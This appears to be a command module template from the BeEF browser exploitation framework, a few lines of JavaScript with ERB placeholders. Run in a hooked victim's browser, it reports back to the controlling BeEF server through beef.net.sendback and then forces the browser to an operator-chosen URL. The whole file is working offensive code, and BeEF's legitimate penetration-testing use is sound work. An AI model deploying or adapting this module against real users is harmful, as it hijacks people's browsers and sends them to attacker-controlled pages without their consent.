beef.execute(function() {
	
    beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape('Redirected to: <%= @redirect_url %>'), function(){window.location = "<%= @redirect_url %>"});

});

